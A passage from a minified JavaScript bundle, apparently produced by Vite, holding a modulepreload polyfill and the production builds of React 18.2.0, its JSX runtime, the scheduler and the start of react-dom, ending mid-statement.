function Uw(t,e){for(var n=0;n<e.length;n++){const r=e[n];if(typeof r!="string"&&!Array.isArray(r)){for(const i in r)if(i!=="default"&&!(i in t)){const s=Object.getOwnPropertyDescriptor(r,i);s&&Object.defineProperty(t,i,s.get?s:{enumerable:!0,get:()=>r[i]})}}}return Object.freeze(Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}))}(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const i of document.querySelectorAll('link[rel="modulepreload"]'))r(i);new MutationObserver(i=>{for(const s of i)if(s.type==="childList")for(const o of s.addedNodes)o.tagName==="LINK"&&o.rel==="modulepreload"&&r(o)}).observe(document,{childList:!0,subtree:!0});function n(i){const s={};return i.integrity&&(s.integrity=i.integrity),i.referrerPolicy&&(s.referrerPolicy=i.referrerPolicy),i.crossOrigin==="use-credentials"?s.credentials="include":i.crossOrigin==="anonymous"?s.credentials="omit":s.credentials="same-origin",s}function r(i){if(i.ep)return;i.ep=!0;const s=n(i);fetch(i.href,s)}})();function Fs(t){return t&&t.__esModule&&Object.prototype.hasOwnProperty.call(t,"default")?t.default:t}var Rm={exports:{}},ql={},Nm={exports:{}},z={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var js=Symbol.for("react.element"),Fw=Symbol.for("react.portal"),jw=Symbol.for("react.fragment"),zw=Symbol.for("react.strict_mode"),Bw=Symbol.for("react.profiler"),Hw=Symbol.for("react.provider"),Ww=Symbol.for("react.context"),$w=Symbol.for("react.forward_ref"),Vw=Symbol.for("react.suspense"),qw=Symbol.for("react.memo"),Gw=Symbol.for("react.lazy"),Vh=Symbol.iterator;function Kw(t){return t===null||typeof t!="object"?null:(t=Vh&&t[Vh]||t["@@iterator"],typeof t=="function"?t:null)}var Pm={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},xm=Object.assign,Am={};function hi(t,e,n){this.props=t,this.context=e,this.refs=Am,this.updater=n||Pm}hi.prototype.isReactComponent={};hi.prototype.setState=function(t,e){if(typeof t!="object"&&typeof t!="function"&&t!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,t,e,"setState")};hi.prototype.forceUpdate=function(t){this.updater.enqueueForceUpdate(this,t,"forceUpdate")};function Om(){}Om.prototype=hi.prototype;function Hc(t,e,n){this.props=t,this.context=e,this.refs=Am,this.updater=n||Pm}var Wc=Hc.prototype=new Om;Wc.constructor=Hc;xm(Wc,hi.prototype);Wc.isPureReactComponent=!0;var qh=Array.isArray,bm=Object.prototype.hasOwnProperty,$c={current:null},Lm={key:!0,ref:!0,__self:!0,__source:!0};function Dm(t,e,n){var r,i={},s=null,o=null;if(e!=null)for(r in e.ref!==void 0&&(o=e.ref),e.key!==void 0&&(s=""+e.key),e)bm.call(e,r)&&!Lm.hasOwnProperty(r)&&(i[r]=e[r]);var l=arguments.length-2;if(l===1)i.children=n;else if(1<l){for(var a=Array(l),u=0;u<l;u++)a[u]=arguments[u+2];i.children=a}if(t&&t.defaultProps)for(r in l=t.defaultProps,l)i[r]===void 0&&(i[r]=l[r]);return{$$typeof:js,type:t,key:s,ref:o,props:i,_owner:$c.current}}function Yw(t,e){return{$$typeof:js,type:t.type,key:e,ref:t.ref,props:t.props,_owner:t._owner}}function Vc(t){return typeof t=="object"&&t!==null&&t.$$typeof===js}function Qw(t){var e={"=":"=0",":":"=2"};return"$"+t.replace(/[=:]/g,function(n){return e[n]})}var Gh=/\/+/g;function Na(t,e){return typeof t=="object"&&t!==null&&t.key!=null?Qw(""+t.key):e.toString(36)}function Po(t,e,n,r,i){var s=typeof t;(s==="undefined"||s==="boolean")&&(t=null);var o=!1;if(t===null)o=!0;else switch(s){case"string":case"number":o=!0;break;case"object":switch(t.$$typeof){case js:case Fw:o=!0}}if(o)return o=t,i=i(o),t=r===""?"."+Na(o,0):r,qh(i)?(n="",t!=null&&(n=t.replace(Gh,"$&/")+"/"),Po(i,e,n,"",function(u){return u})):i!=null&&(Vc(i)&&(i=Yw(i,n+(!i.key||o&&o.key===i.key?"":(""+i.key).replace(Gh,"$&/")+"/")+t)),e.push(i)),1;if(o=0,r=r===""?".":r+":",qh(t))for(var l=0;l<t.length;l++){s=t[l];var a=r+Na(s,l);o+=Po(s,e,n,a,i)}else if(a=Kw(t),typeof a=="function")for(t=a.call(t),l=0;!(s=t.next()).done;)s=s.value,a=r+Na(s,l++),o+=Po(s,e,n,a,i);else if(s==="object")throw e=String(t),Error("Objects are not valid as a React child (found: "+(e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e)+"). If you meant to render a collection of children, use an array instead.");return o}function oo(t,e,n){if(t==null)return t;var r=[],i=0;return Po(t,r,"","",function(s){return e.call(n,s,i++)}),r}function Xw(t){if(t._status===-1){var e=t._result;e=e(),e.then(function(n){(t._status===0||t._status===-1)&&(t._status=1,t._result=n)},function(n){(t._status===0||t._status===-1)&&(t._status=2,t._result=n)}),t._status===-1&&(t._status=0,t._result=e)}if(t._status===1)return t._result.default;throw t._result}var De={current:null},xo={transition:null},Jw={ReactCurrentDispatcher:De,ReactCurrentBatchConfig:xo,ReactCurrentOwner:$c};z.Children={map:oo,forEach:function(t,e,n){oo(t,function(){e.apply(this,arguments)},n)},count:function(t){var e=0;return oo(t,function(){e++}),e},toArray:function(t){return oo(t,function(e){return e})||[]},only:function(t){if(!Vc(t))throw Error("React.Children.only expected to receive a single React element child.");return t}};z.Component=hi;z.Fragment=jw;z.Profiler=Bw;z.PureComponent=Hc;z.StrictMode=zw;z.Suspense=Vw;z.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Jw;z.cloneElement=function(t,e,n){if(t==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+t+".");var r=xm({},t.props),i=t.key,s=t.ref,o=t._owner;if(e!=null){if(e.ref!==void 0&&(s=e.ref,o=$c.current),e.key!==void 0&&(i=""+e.key),t.type&&t.type.defaultProps)var l=t.type.defaultProps;for(a in e)bm.call(e,a)&&!Lm.hasOwnProperty(a)&&(r[a]=e[a]===void 0&&l!==void 0?l[a]:e[a])}var a=arguments.length-2;if(a===1)r.children=n;else if(1<a){l=Array(a);for(var u=0;u<a;u++)l[u]=arguments[u+2];r.children=l}return{$$typeof:js,type:t.type,key:i,ref:s,props:r,_owner:o}};z.createContext=function(t){return t={$$typeof:Ww,_currentValue:t,_currentValue2:t,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},t.Provider={$$typeof:Hw,_context:t},t.Consumer=t};z.createElement=Dm;z.createFactory=function(t){var e=Dm.bind(null,t);return e.type=t,e};z.createRef=function(){return{current:null}};z.forwardRef=function(t){return{$$typeof:$w,render:t}};z.isValidElement=Vc;z.lazy=function(t){return{$$typeof:Gw,_payload:{_status:-1,_result:t},_init:Xw}};z.memo=function(t,e){return{$$typeof:qw,type:t,compare:e===void 0?null:e}};z.startTransition=function(t){var e=xo.transition;xo.transition={};try{t()}finally{xo.transition=e}};z.unstable_act=function(){throw Error("act(...) is not supported in production builds of React.")};z.useCallback=function(t,e){return De.current.useCallback(t,e)};z.useContext=function(t){return De.current.useContext(t)};z.useDebugValue=function(){};z.useDeferredValue=function(t){return De.current.useDeferredValue(t)};z.useEffect=function(t,e){return De.current.useEffect(t,e)};z.useId=function(){return De.current.useId()};z.useImperativeHandle=function(t,e,n){return De.current.useImperativeHandle(t,e,n)};z.useInsertionEffect=function(t,e){return De.current.useInsertionEffect(t,e)};z.useLayoutEffect=function(t,e){return De.current.useLayoutEffect(t,e)};z.useMemo=function(t,e){return De.current.useMemo(t,e)};z.useReducer=function(t,e,n){return De.current.useReducer(t,e,n)};z.useRef=function(t){return De.current.useRef(t)};z.useState=function(t){return De.current.useState(t)};z.useSyncExternalStore=function(t,e,n){return De.current.useSyncExternalStore(t,e,n)};z.useTransition=function(){return De.current.useTransition()};z.version="18.2.0";Nm.exports=z;var I=Nm.exports;const qn=Fs(I),Zw=Uw({__proto__:null,default:qn},[I]);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var e0=I,t0=Symbol.for("react.element"),n0=Symbol.for("react.fragment"),r0=Object.prototype.hasOwnProperty,i0=e0.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,s0={key:!0,ref:!0,__self:!0,__source:!0};function Mm(t,e,n){var r,i={},s=null,o=null;n!==void 0&&(s=""+n),e.key!==void 0&&(s=""+e.key),e.ref!==void 0&&(o=e.ref);for(r in e)r0.call(e,r)&&!s0.hasOwnProperty(r)&&(i[r]=e[r]);if(t&&t.defaultProps)for(r in e=t.defaultProps,e)i[r]===void 0&&(i[r]=e[r]);return{$$typeof:t0,type:t,key:s,ref:o,props:i,_owner:i0.current}}ql.Fragment=n0;ql.jsx=Mm;ql.jsxs=Mm;Rm.exports=ql;var E=Rm.exports,Eu={},Um={exports:{}},Ze={},Fm={exports:{}},jm={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(t){function e(P,L){var D=P.length;P.push(L);e:for(;0<D;){var ae=D-1>>>1,me=P[ae];if(0<i(me,L))P[ae]=L,P[D]=me,D=ae;else break e}}function n(P){return P.length===0?null:P[0]}function r(P){if(P.length===0)return null;var L=P[0],D=P.pop();if(D!==L){P[0]=D;e:for(var ae=0,me=P.length,io=me>>>1;ae<io;){var Ln=2*(ae+1)-1,Ra=P[Ln],Dn=Ln+1,so=P[Dn];if(0>i(Ra,D))Dn<me&&0>i(so,Ra)?(P[ae]=so,P[Dn]=D,ae=Dn):(P[ae]=Ra,P[Ln]=D,ae=Ln);else if(Dn<me&&0>i(so,D))P[ae]=so,P[Dn]=D,ae=Dn;else break e}}return L}function i(P,L){var D=P.sortIndex-L.sortIndex;return D!==0?D:P.id-L.id}if(typeof performance=="object"&&typeof performance.now=="function"){var s=performance;t.unstable_now=function(){return s.now()}}else{var o=Date,l=o.now();t.unstable_now=function(){return o.now()-l}}var a=[],u=[],c=1,d=null,h=3,m=!1,_=!1,v=!1,w=typeof setTimeout=="function"?setTimeout:null,p=typeof clearTimeout=="function"?clearTimeout:null,f=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function g(P){for(var L=n(u);L!==null;){if(L.callback===null)r(u);else if(L.startTime<=P)r(u),L.sortIndex=L.expirationTime,e(a,L);else break;L=n(u)}}function y(P){if(v=!1,g(P),!_)if(n(a)!==null)_=!0,Ia(T);else{var L=n(u);L!==null&&ka(y,L.startTime-P)}}function T(P,L){_=!1,v&&(v=!1,p(x),x=-1),m=!0;var D=h;try{for(g(L),d=n(a);d!==null&&(!(d.expirationTime>L)||P&&!lt());){var ae=d.callback;if(typeof ae=="function"){d.callback=null,h=d.priorityLevel;var me=ae(d.expirationTime<=L);L=t.unstable_now(),typeof me=="function"?d.callback=me:d===n(a)&&r(a),g(L)}else r(a);d=n(a)}if(d!==null)var io=!0;else{var Ln=n(u);Ln!==null&&ka(y,Ln.startTime-L),io=!1}return io}finally{d=null,h=D,m=!1}}var k=!1,N=null,x=-1,W=5,F=-1;function lt(){return!(t.unstable_now()-F<W)}function Si(){if(N!==null){var P=t.unstable_now();F=P;var L=!0;try{L=N(!0,P)}finally{L?Ti():(k=!1,N=null)}}else k=!1}var Ti;if(typeof f=="function")Ti=function(){f(Si)};else if(typeof MessageChannel<"u"){var $h=new MessageChannel,Mw=$h.port2;$h.port1.onmessage=Si,Ti=function(){Mw.postMessage(null)}}else Ti=function(){w(Si,0)};function Ia(P){N=P,k||(k=!0,Ti())}function ka(P,L){x=w(function(){P(t.unstable_now())},L)}t.unstable_IdlePriority=5,t.unstable_ImmediatePriority=1,t.unstable_LowPriority=4,t.unstable_NormalPriority=3,t.unstable_Profiling=null,t.unstable_UserBlockingPriority=2,t.unstable_cancelCallback=function(P){P.callback=null},t.unstable_continueExecution=function(){_||m||(_=!0,Ia(T))},t.unstable_forceFrameRate=function(P){0>P||125<P?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):W=0<P?Math.floor(1e3/P):5},t.unstable_getCurrentPriorityLevel=function(){return h},t.unstable_getFirstCallbackNode=function(){return n(a)},t.unstable_next=function(P){switch(h){case 1:case 2:case 3:var L=3;break;default:L=h}var D=h;h=L;try{return P()}finally{h=D}},t.unstable_pauseExecution=function(){},t.unstable_requestPaint=function(){},t.unstable_runWithPriority=function(P,L){switch(P){case 1:case 2:case 3:case 4:case 5:break;default:P=3}var D=h;h=P;try{return L()}finally{h=D}},t.unstable_scheduleCallback=function(P,L,D){var ae=t.unstable_now();switch(typeof D=="object"&&D!==null?(D=D.delay,D=typeof D=="number"&&0<D?ae+D:ae):D=ae,P){case 1:var me=-1;break;case 2:me=250;break;case 5:me=1073741823;break;case 4:me=1e4;break;default:me=5e3}return me=D+me,P={id:c++,callback:L,priorityLevel:P,startTime:D,expirationTime:me,sortIndex:-1},D>ae?(P.sortIndex=D,e(u,P),n(a)===null&&P===n(u)&&(v?(p(x),x=-1):v=!0,ka(y,D-ae))):(P.sortIndex=me,e(a,P),_||m||(_=!0,Ia(T))),P},t.unstable_shouldYield=lt,t.unstable_wrapCallback=function(P){var L=h;return function(){var D=h;h=L;try{return P.apply(this,arguments)}finally{h=D}}}})(jm);Fm.exports=jm;var o0=Fm.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var zm=I,Je=o0;function C(t){for(var e="https://reactjs.org/docs/error-decoder.html?invariant="+t,n=1;n<arguments.length;n++)e+="&args[]="+encodeURIComponent(arguments[n]);return"Minified React error #"+t+"; visit "+e+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var Bm=new Set,ls={};function fr(t,e){Zr(t,e),Zr(t+"Capture",e)}function Zr(t,e){for(ls[t]=e,t=0;t<e.length;t++)Bm.add(e[t])}var Bt=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),Cu=Object.prototype.hasOwnProperty,l0=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,Kh={},Yh={};function a0(t){return Cu.call(Yh,t)?!0:Cu.call(Kh,t)?!1:l0.test(t)?Yh[t]=!0:(Kh[t]=!0,!1)}function u0(t,e,n,r){if(n!==null&&n.type===0)return!1;switch(typeof e){case"function":case"symbol":return!0;case"boolean":return r?!1:n!==null?!n.acceptsBooleans:(t=t.toLowerCase().slice(0,5),t!=="data-"&&t!=="aria-");default:return!1}}function c0(t,e,n,r){if(e===null||typeof e>"u"||u0(t,e,n,r))return!0;if(r)return!1;if(n!==null)switch(n.type){case 3:return!e;case 4:return e===!1;case 5:return isNaN(e);case 6:return isNaN(e)||1>e}return!1}function Me(t,e,n,r,i,s,o){this.acceptsBooleans=e===2||e===3||e===4,this.attributeName=r,this.attributeNamespace=i,this.mustUseProperty=n,this.propertyName=t,this.type=e,this.sanitizeURL=s,this.removeEmptyString=o}var Te={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(t){Te[t]=new Me(t,0,!1,t,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(t){var e=t[0];Te[e]=new Me(e,1,!1,t[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(t){Te[t]=new Me(t,2,!1,t.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(t){Te[t]=new Me(t,2,!1,t,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(t){Te[t]=new Me(t,3,!1,t.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(t){Te[t]=new Me(t,3,!0,t,null,!1,!1)});["capture","download"].forEach(function(t){Te[t]=new Me(t,4,!1,t,null,!1,!1)});["cols","rows","size","span"].forEach(function(t){Te[t]=new Me(t,6,!1,t,null,!1,!1)});["rowSpan","start"].forEach(function(t){Te[t]=new Me(t,5,!1,t.toLowerCase(),null,!1,!1)});var qc=/[\-:]([a-z])/g;function Gc(t){return t[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(t){var e=t.replace(qc,Gc);Te[e]=new Me(e,1,!1,t,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(t){var e=t.replace(qc,Gc);Te[e]=new Me(e,1,!1,t,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(t){var e=t.replace(qc,Gc);Te[e]=new Me(e,1,!1,t,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(t){Te[t]=new Me(t,1,!1,t.toLowerCase(),null,!1,!1)});Te.xlinkHref=new Me("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(t){Te[t]=new Me(t,1,!1,t.toLowerCase(),null,!0,!0)});function Kc(t,e,n,r){var i=Te.hasOwnProperty(e)?Te[e]:null;(i!==null?i.type!==0:r||!(2<e.length)||e[0]!=="o"&&e[0]!=="O"||e[1]!=="n"&&e[1]!=="N")&&(c0(e,n,i,r)&&(n=null),r||i===null?a0(e)&&(n===null?t.removeAttribute(e):t.setAttribute(e,""+n)):i.mustUseProperty?t[i.propertyName]=n===null?i.type===3?!1:"":n:(e=i.attributeName,r=i.attributeNamespace,n===null?t.removeAttribute(e):(i=i.type,n=i===3||i===4&&n===!0?"":""+n,r?t.setAttributeNS(r,e,n):t.setAttribute(e,n))))}var Kt=zm.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,lo=Symbol.for("react.element"),kr=Symbol.for("react.portal"),Rr=Symbol.for("react.fragment"),Yc=Symbol.for("react.strict_mode"),Su=Symbol.for("react.profiler"),Hm=Symbol.for("react.provider"),Wm=Symbol.for("react.context"),Qc=Symbol.for("react.forward_ref"),Tu=Symbol.for("react.suspense"),Iu=Symbol.for("react.suspense_list"),Xc=Symbol.for("react.memo"),en=Symbol.for("react.lazy"),$m=Symbol.for("react.offscreen"),Qh=Symbol.iterator;function Ii(t){return t===null||typeof t!="object"?null:(t=Qh&&t[Qh]||t["@@iterator"],typeof t=="function"?t:null)}var ie=Object.assign,Pa;function zi(t){if(Pa===void 0)try{throw Error()}catch(n){var e=n.stack.trim().match(/\n( *(at )?)/);Pa=e&&e[1]||""}return`
`+Pa+t}var xa=!1;function Aa(t,e){if(!t||xa)return"";xa=!0;var n=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(e)if(e=function(){throw Error()},Object.defineProperty(e.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(e,[])}catch(u){var r=u}Reflect.construct(t,[],e)}else{try{e.call()}catch(u){r=u}t.call(e.prototype)}else{try{throw Error()}catch(u){r=u}t()}}catch(u){if(u&&r&&typeof u.stack=="string"){for(var i=u.stack.split(`
`),s=r.stack.split(`
`),o=i.length-1,l=s.length-1;1<=o&&0<=l&&i[o]!==s[l];)l--;for(;1<=o&&0<=l;o--,l--)if(i[o]!==s[l]){if(o!==1||l!==1)do if(o--,l--,0>l||i[o]!==s[l]){var a=`
`+i[o].replace(" at new "," at ");return t.displayName&&a.includes("<anonymous>")&&(a=a.replace("<anonymous>",t.displayName)),a}while(1<=o&&0<=l);break}}}finally{xa=!1,Error.prepareStackTrace=n}return(t=t?t.displayName||t.name:"")?zi(t):""}function d0(t){switch(t.tag){case 5:return zi(t.type);case 16:return zi("Lazy");case 13:return zi("Suspense");case 19:return zi("SuspenseList");case 0:case 2:case 15:return t=Aa(t.type,!1),t;case 11:return t=Aa(t.type.render,!1),t;case 1:return t=Aa(t.type,!0),t;default:return""}}function ku(t){if(t==null)return null;if(typeof t=="function")return t.displayName||t.name||null;if(typeof t=="string")return t;switch(t){case Rr:return"Fragment";case kr:return"Portal";case Su:return"Profiler";case Yc:return"StrictMode";case Tu:return"Suspense";case Iu:return"SuspenseList"}if(typeof t=="object")switch(t.$$typeof){case Wm:return(t.displayName||"Context")+".Consumer";case Hm:return(t._context.displayName||"Context")+".Provider";case Qc:var e=t.render;return t=t.displayName,t||(t=e.displayName||e.name||"",t=t!==""?"ForwardRef("+t+")":"ForwardRef"),t;case Xc:return e=t.displayName||null,e!==null?e:ku(t.type)||"Memo";case en:e=t._payload,t=t._init;try{return ku(t(e))}catch{}}return null}function h0(t){var e=t.type;switch(t.tag){case 24:return"Cache";case 9:return(e.displayName||"Context")+".Consumer";case 10:return(e._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return t=e.render,t=t.displayName||t.name||"",e.displayName||(t!==""?"ForwardRef("+t+")":"ForwardRef");case 7:return"Fragment";case 5:return e;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return ku(e);case 8:return e===Yc?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e}return null}function In(t){switch(typeof t){case"boolean":case"number":case"string":case"undefined":return t;case"object":return t;default:return""}}function Vm(t){var e=t.type;return(t=t.nodeName)&&t.toLowerCase()==="input"&&(e==="checkbox"||e==="radio")}function f0(t){var e=Vm(t)?"checked":"value",n=Object.getOwnPropertyDescriptor(t.constructor.prototype,e),r=""+t[e];if(!t.hasOwnProperty(e)&&typeof n<"u"&&typeof n.get=="function"&&typeof n.set=="function"){var i=n.get,s=n.set;return Object.defineProperty(t,e,{configurable:!0,get:function(){return i.call(this)},set:function(o){r=""+o,s.call(this,o)}}),Object.defineProperty(t,e,{enumerable:n.enumerable}),{getValue:function(){return r},setValue:function(o){r=""+o},stopTracking:function(){t._valueTracker=null,delete t[e]}}}}function ao(t){t._valueTracker||(t._valueTracker=f0(t))}function qm(t){if(!t)return!1;var e=t._valueTracker;if(!e)return!0;var n=e.getValue(),r="";return t&&(r=Vm(t)?t.checked?"true":"false":t.value),t=r,t!==n?(e.setValue(t),!0):!1}function qo(t){if(t=t||(typeof document<"u"?document:void 0),typeof t>"u")return null;try{return t.activeElement||t.body}catch{return t.body}}function Ru(t,e){var n=e.checked;return ie({},e,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:n??t._wrapperState.initialChecked})}function Xh(t,e){var n=e.defaultValue==null?"":e.defaultValue,r=e.checked!=null?e.checked:e.defaultChecked;n=In(e.value!=null?e.value:n),t._wrapperState={initialChecked:r,initialValue:n,controlled:e.type==="checkbox"||e.type==="radio"?e.checked!=null:e.value!=null}}function Gm(t,e){e=e.checked,e!=null&&Kc(t,"checked",e,!1)}function Nu(t,e){Gm(t,e);var n=In(e.value),r=e.type;if(n!=null)r==="number"?(n===0&&t.value===""||t.value!=n)&&(t.value=""+n):t.value!==""+n&&(t.value=""+n);else if(r==="submit"||r==="reset"){t.removeAttribute("value");return}e.hasOwnProperty("value")?Pu(t,e.type,n):e.hasOwnProperty("defaultValue")&&Pu(t,e.type,In(e.defaultValue)),e.checked==null&&e.defaultChecked!=null&&(t.defaultChecked=!!e.defaultChecked)}function Jh(t,e,n){if(e.hasOwnProperty("value")||e.hasOwnProperty("defaultValue")){var r=e.type;if(!(r!=="submit"&&r!=="reset"||e.value!==void 0&&e.value!==null))return;e=""+t._wrapperState.initialValue,n||e===t.value||(t.value=e),t.defaultValue=e}n=t.name,n!==""&&(t.name=""),t.defaultChecked=!!t._wrapperState.initialChecked,n!==""&&(t.name=n)}function Pu(t,e,n){(e!=="number"||qo(t.ownerDocument)!==t)&&(n==null?t.defaultValue=""+t._wrapperState.initialValue:t.defaultValue!==""+n&&(t.defaultValue=""+n))}var Bi=Array.isArray;function zr(t,e,n,r){if(t=t.options,e){e={};for(var i=0;i<n.length;i++)e["$"+n[i]]=!0;for(n=0;n<t.length;n++)i=e.hasOwnProperty("$"+t[n].value),t[n].selected!==i&&(t[n].selected=i),i&&r&&(t[n].defaultSelected=!0)}else{for(n=""+In(n),e=null,i=0;i<t.length;i++){if(t[i].value===n){t[i].selected=!0,r&&(t[i].defaultSelected=!0);return}e!==null||t[i].disabled||(e=t[i])}e!==null&&(e.selected=!0)}}function xu(t,e){if(e.dangerouslySetInnerHTML!=null)throw Error(C(91));return ie({},e,{value:void 0,defaultValue:void 0,children:""+t._wrapperState.initialValue})}function Zh(t,e){var n=e.value;if(n==null){if(n=e.children,e=e.defaultValue,n!=null){if(e!=null)throw Error(C(92));if(Bi(n)){if(1<n.length)throw Error(C(93));n=n[0]}e=n}e==null&&(e=""),n=e}t._wrapperState={initialValue:In(n)}}function Km(t,e){var n=In(e.value),r=In(e.defaultValue);n!=null&&(n=""+n,n!==t.value&&(t.value=n),e.defaultValue==null&&t.defaultValue!==n&&(t.defaultValue=n)),r!=null&&(t.defaultValue=""+r)}function ef(t){var e=t.textContent;e===t._wrapperState.initialValue&&e!==""&&e!==null&&(t.value=e)}function Ym(t){switch(t){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function Au(t,e){return t==null||t==="http://www.w3.org/1999/xhtml"?Ym(e):t==="http://www.w3.org/2000/svg"&&e==="foreignObject"?"http://www.w3.org/1999/xhtml":t}var uo,Qm=function(t){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(e,n,r,i){MSApp.execUnsafeLocalFunction(function(){return t(e,n,r,i)})}:t}(function(t,e){if(t.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in t)t.innerHTML=e;else{for(uo=uo||document.createElement("div"),uo.innerHTML="<svg>"+e.valueOf().toString()+"</svg>",e=uo.firstChild;t.firstChild;)t.removeChild(t.firstChild);for(;e.firstChild;)t.appendChild(e.firstChild)}});function as(t,e){if(e){var n=t.firstChild;if(n&&n===t.lastChild&&n.nodeType===3){n.nodeValue=e;return}}t.textContent=e}var qi={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},p0=["Webkit","ms","Moz","O"];Object.keys(qi).forEach(function(t){p0.forEach(function(e){e=e+t.charAt(0).toUpperCase()+t.substring(1),qi[e]=qi[t]})});function Xm(t,e,n){return e==null||typeof e=="boolean"||e===""?"":n||typeof e!="number"||e===0||qi.hasOwnProperty(t)&&qi[t]?(""+e).trim():e+"px"}function Jm(t,e){t=t.style;for(var n in e)if(e.hasOwnProperty(n)){var r=n.indexOf("--")===0,i=Xm(n,e[n],r);n==="float"&&(n="cssFloat"),r?t.setProperty(n,i):t[n]=i}}var 